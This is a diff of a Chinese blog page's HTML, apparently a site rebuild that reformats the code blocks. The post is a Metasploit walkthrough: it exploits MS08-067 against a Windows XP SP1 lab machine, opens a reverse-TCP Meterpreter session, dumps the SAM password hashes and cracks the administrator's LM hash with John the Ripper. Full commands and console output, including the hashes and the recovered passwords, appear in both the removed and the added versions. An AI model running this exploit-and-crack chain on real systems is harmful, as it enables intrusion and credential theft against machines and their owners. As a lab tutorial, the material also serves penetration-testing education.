@@ -422,17 +422,96 @@
             <div id="articleContent">
                 <h1 id="metsploit获取电脑密码"><a href="#metsploit获取电脑密码" class="headerlink" title="metsploit获取电脑密码"></a>metsploit获取电脑密码</h1><p>首先简单介绍一下metsploit这个工具，它是一款开源的安全漏洞检测工具，你可以利用这个工具中的模块，来对目标服务器进行渗透测试，例如经典的ms08_067等</p>
 <h2 id="开启软件"><a href="#开启软件" class="headerlink" title="开启软件"></a>开启软件</h2><p>攻击机: Kali Linux<br>靶机: WindowsXP SP1<br>软件版本: 4.16.32</p>
-<p>命令:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root<span class="variable">@kali</span><span class="symbol">:~</span><span class="comment"># msfconsole</span></span><br></pre></td></tr></table></figure></p>
-<p><img src="http://t1.aixinxi.net/o_1cbqitmj21s00vhh1mm816o13soa.png-j.jpg" alt="应用截图"></p>
-<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><p>这次实验就用ms08067模块的来测试，若觉得过于无聊像直接跳到破解hash，可以直接跳到相应环节，那么，首先先查询模块的位置<br><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; <span class="built_in">search</span> ms08_067</span><br></pre></td></tr></table></figure></p>
-<p><img src="http://t1.aixinxi.net/o_1cbqjaf2m1lbih2f1n8c1ukp11poa.png-j.jpg" alt=""><br>可以看到这个模块是在exploit/windows/smb/下的，接着用use命令去使用它，然后show options 来查看需要配置的选项<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/smb/ms08_067_netapi </span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms08_067_netapi):</span><br><span class="line"></span><br><span class="line">   Name     Current Setting  Required  Description</span><br><span class="line">   ----     ---------------  --------  -----------</span><br><span class="line">   RHOST                     <span class="literal">yes</span>       The target address</span><br><span class="line">   RPORT    445              <span class="literal">yes</span>       The<span class="built_in"> SMB service port </span>(TCP)</span><br><span class="line">   SMBPIPE  BROWSER          <span class="literal">yes</span>       The pipe name <span class="keyword">to</span> use (BROWSER, SRVSVC)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic Targeting</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt;</span><br></pre></td></tr></table></figure></p>
-<p>设置目标IP<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms<span class="number">08</span>_<span class="number">067</span>_netapi) &gt; set rhost <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span></span><br></pre></td></tr></table></figure></p>
-<p>设置完后，就可以开始攻击了<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms<span class="number">08</span>_<span class="number">067</span>_netapi) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">4444</span> </span><br><span class="line">[*] <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">445</span> - Automatically detecting the <span class="keyword">target</span>...</span><br><span class="line">[*] <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">445</span> - Fingerprint: Windows XP - Service Pack <span class="number">0</span> / <span class="number">1</span> - lang:English</span><br><span class="line">[*] <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">445</span> - Selected Target: Windows XP SP<span class="number">0</span>/SP<span class="number">1</span> Universal</span><br><span class="line">[*] <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">445</span> - Attempting <span class="keyword">to</span> trigger the vulnerability...</span><br><span class="line">[*] Sending stage (<span class="number">179779</span> bytes) <span class="keyword">to</span> <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span></span><br><span class="line">[*] Meterpreter session <span class="number">1</span> opened (<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">4444</span> -&gt; <span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>.<span class="keyword">x</span>:<span class="number">1040</span>) at <span class="number">2018</span><span class="number">-04</span><span class="number">-24</span> <span class="number">17</span>:<span class="number">15</span>:<span class="number">53</span> +<span class="number">0800</span></span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure></p>
-<p>成功，这个时候我们就可以一定程度的为所欲为了，可以进行下一步，也就是本篇的主题了</p>
-<h2 id="破解hash密码"><a href="#破解hash密码" class="headerlink" title="破解hash密码"></a>破解hash密码</h2><p>先在对方电脑上留一个会话，方便再次进入<br><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">meterpreter</span> &gt; <span class="keyword">background </span></span><br><span class="line">[*] <span class="keyword">Backgrounding </span>session <span class="number">1</span>...</span><br><span class="line"><span class="symbol">msf</span> exploit(windows/smb/ms08_067_netapi) &gt;</span><br></pre></td></tr></table></figure></p>
-<p>然后进行下一步,hashdump(PS:这一步需要连接metsploit的数据库，可以移步另一篇)<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/hashdump </span><br><span class="line">msf post(windows/gather/hashdump) &gt; <span class="builtin-name">set</span> session 1</span><br><span class="line">session =&gt; 1</span><br><span class="line">msf post(windows/gather/hashdump) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key<span class="built_in">..</span>.</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 428e28b631cc943839d3825b82f120d5<span class="built_in">..</span>.</span><br><span class="line">[*] Obtaining the<span class="built_in"> user </span>list <span class="keyword">and</span> keys<span class="built_in">..</span>.</span><br><span class="line">[*] Decrypting<span class="built_in"> user </span>keys<span class="built_in">..</span>.</span><br><span class="line">[*] Dumping password hints<span class="built_in">..</span>.</span><br><span class="line">[*] Dumping password hashes<span class="built_in">..</span>.</span><br><span class="line"></span><br><span class="line">Administrator:500:a1ee20c00c723dd2aad3b435b51404ee:2faf5f4a6e588f18f1f84616da5ba9a7:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HelpAssistant:1000:5e524bae58d900e05d22d4ead5281bca:702eed191404bc7a910cf5e551cd6f3b:::</span><br><span class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:202d3a3a623de3bbc30ab1c2784d0102:::</span><br><span class="line">hacker:1004:1f27acde849935b0aad3b435b51404ee:579110c49145015c47ecd267657d3174:::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] Post module execution completed</span><br></pre></td></tr></table></figure></p>
-<p>利用jtr_crack_fast模块来爆破密码<br><figure class="highlight vhdl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">msf post(windows/gather/hashdump) &gt; <span class="keyword">use</span> auxiliary/analyze/jtr_crack_fast</span><br><span class="line">msf auxiliary(analyze/jtr_crack_fast) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Wordlist <span class="keyword">file</span> written <span class="keyword">out</span> <span class="keyword">to</span> /tmp/jtrtmp20180424-<span class="number">3414</span>-<span class="number">19</span>br28b</span><br><span class="line">[*] Hashes Written <span class="keyword">out</span> <span class="keyword">to</span> /tmp/hashes_tmp20180424-<span class="number">3414</span>-nv7b02</span><br><span class="line">[*] Cracking lm hashes <span class="keyword">in</span> normal wordlist mode...</span><br><span class="line">Created directory: /root/.john</span><br><span class="line">[*] Loaded <span class="number">5</span> password hashes <span class="keyword">with</span> no different salts (LM [DES <span class="number">128</span>/<span class="number">128</span> AVX-<span class="number">16</span>])</span><br><span class="line">Press <span class="symbol">'q</span>' <span class="keyword">or</span> Ctrl-C <span class="keyword">to</span> abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">[*] <span class="number">123123</span>           (hacker)</span><br><span class="line">[*] FRANK            (administrator)</span><br><span class="line"><span class="number">2</span>g <span class="number">0</span>:<span class="number">00</span>:<span class="number">00</span>:<span class="number">00</span> DONE (Tue Apr <span class="number">24</span> <span class="number">17</span>:<span class="number">53</span>:<span class="number">06</span> <span class="number">2018</span>) <span class="number">22.22</span>g/s <span class="number">857544</span>p/s <span class="number">857544</span>c/s <span class="number">2599</span>KC/s ZIRCON..VAGRANT</span><br><span class="line"></span><br><span class="line"><span class="literal">Warning</span>: passwords printed above might be partial <span class="keyword">and</span> <span class="keyword">not</span> be <span class="keyword">all</span> those cracked</span><br><span class="line"><span class="keyword">Use</span> the <span class="string">"--show"</span> option <span class="keyword">to</span> display <span class="keyword">all</span> <span class="keyword">of</span> the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line"></span><br><span class="line">[*] Cracked Passwords this run:</span><br><span class="line">[+] administrator:frank:<span class="number">2</span>:<span class="number">2</span></span><br><span class="line">[+] hacker:<span class="number">123123</span>:<span class="number">6</span>:<span class="number">6</span></span><br><span class="line">[*] Auxiliary module execution completed</span><br><span class="line">msf auxiliary(analyze/jtr_crack_fast) &gt;</span><br></pre></td></tr></table></figure></p>
-<p>可以看到，密码已经出来了,administrator的密码为frank，完成</p>
+<p>命令:</p>
+<pre><code>root@kali:~# msfconsole
+</code></pre><p><img src="http://t1.aixinxi.net/o_1cbqitmj21s00vhh1mm816o13soa.png-j.jpg" alt="应用截图"></p>
+<h2 id="开始实验"><a href="#开始实验" class="headerlink" title="开始实验"></a>开始实验</h2><p>这次实验就用ms08067模块的来测试，若觉得过于无聊像直接跳到破解hash，可以直接跳到相应环节，那么，首先先查询模块的位置</p>
+<pre><code>msf &gt; search ms08_067
+</code></pre><p><img src="http://t1.aixinxi.net/o_1cbqjaf2m1lbih2f1n8c1ukp11poa.png-j.jpg" alt=""><br>可以看到这个模块是在exploit/windows/smb/下的，接着用use命令去使用它，然后show options 来查看需要配置的选项</p>
+<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi 
+msf exploit(windows/smb/ms08_067_netapi) &gt; show options
+
+Module options (exploit/windows/smb/ms08_067_netapi):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   RHOST                     yes       The target address
+   RPORT    445              yes       The SMB service port (TCP)
+   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Targeting
+
+
+msf exploit(windows/smb/ms08_067_netapi) &gt;
+</code></pre><p>设置目标IP</p>
+<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; set rhost x.x.x.x
+</code></pre><p>设置完后，就可以开始攻击了</p>
+<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; exploit 
+
+[*] Started reverse TCP handler on x.x.x.x:4444 
+[*] x.x.x.x:445 - Automatically detecting the target...
+[*] x.x.x.x:445 - Fingerprint: Windows XP - Service Pack 0 / 1 - lang:English
+[*] x.x.x.x:445 - Selected Target: Windows XP SP0/SP1 Universal
+[*] x.x.x.x:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (179779 bytes) to x.x.x.x
+[*] Meterpreter session 1 opened (x.x.x.x:4444 -&gt; x.x.x.x:1040) at 2018-04-24 17:15:53 +0800
+
+meterpreter &gt;
+</code></pre><p>成功，这个时候我们就可以一定程度的为所欲为了，可以进行下一步，也就是本篇的主题了</p>
+<h2 id="破解hash密码"><a href="#破解hash密码" class="headerlink" title="破解hash密码"></a>破解hash密码</h2><p>先在对方电脑上留一个会话，方便再次进入</p>
+<pre><code>meterpreter &gt; background 
+[*] Backgrounding session 1...
+msf exploit(windows/smb/ms08_067_netapi) &gt;
+</code></pre><p>然后进行下一步,hashdump(PS:这一步需要连接metsploit的数据库，可以移步另一篇)</p>
+<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/hashdump 
+msf post(windows/gather/hashdump) &gt; set session 1
+session =&gt; 1
+msf post(windows/gather/hashdump) &gt; exploit 
+
+[*] Obtaining the boot key...
+[*] Calculating the hboot key using SYSKEY 428e28b631cc943839d3825b82f120d5...
+[*] Obtaining the user list and keys...
+[*] Decrypting user keys...
+[*] Dumping password hints...
+[*] Dumping password hashes...
+
+Administrator:500:a1ee20c00c723dd2aad3b435b51404ee:2faf5f4a6e588f18f1f84616da5ba9a7:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:5e524bae58d900e05d22d4ead5281bca:702eed191404bc7a910cf5e551cd6f3b:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:202d3a3a623de3bbc30ab1c2784d0102:::
+hacker:1004:1f27acde849935b0aad3b435b51404ee:579110c49145015c47ecd267657d3174:::
+
+
+[*] Post module execution completed
+</code></pre><p>利用jtr_crack_fast模块来爆破密码</p>
+<pre><code>msf post(windows/gather/hashdump) &gt; use auxiliary/analyze/jtr_crack_fast
+msf auxiliary(analyze/jtr_crack_fast) &gt; exploit 
+
+[*] Wordlist file written out to /tmp/jtrtmp20180424-3414-19br28b
+[*] Hashes Written out to /tmp/hashes_tmp20180424-3414-nv7b02
+[*] Cracking lm hashes in normal wordlist mode...
+Created directory: /root/.john
+[*] Loaded 5 password hashes with no different salts (LM [DES 128/128 AVX-16])
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+[*] 123123           (hacker)
+[*] FRANK            (administrator)
+2g 0:00:00:00 DONE (Tue Apr 24 17:53:06 2018) 22.22g/s 857544p/s 857544c/s 2599KC/s ZIRCON..VAGRANT
+
+Warning: passwords printed above might be partial and not be all those cracked
+Use the &quot;--show&quot; option to display all of the cracked passwords reliably
+Session completed
+
+[*] Cracked Passwords this run:
+[+] administrator:frank:2:2
+[+] hacker:123123:6:6
+[*] Auxiliary module execution completed
+msf auxiliary(analyze/jtr_crack_fast) &gt;
+</code></pre><p>可以看到，密码已经出来了,administrator的密码为frank，完成</p>
 
             </div>
             <hr/>
@@ -605,9 +684,9 @@
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">启动数据库1root@kali:~# /etc/init.d/postgresql start
+                    <div class="summary">启动数据库root@kali:~# /etc/init.d/postgresql start
 查看数据库配置信息一般来说metsploit都会给你自动创建一个数据库，所以看着配置信息去连接就可以了
-1root@kali:~# vim /u</div>
+root@kali:~# vim /usr</div>
                     <div class="publish-info">
                         <span class="publish-date">
                             <i class="fa fa-clock-o fa-fw icon-date"></i>2018-04-24
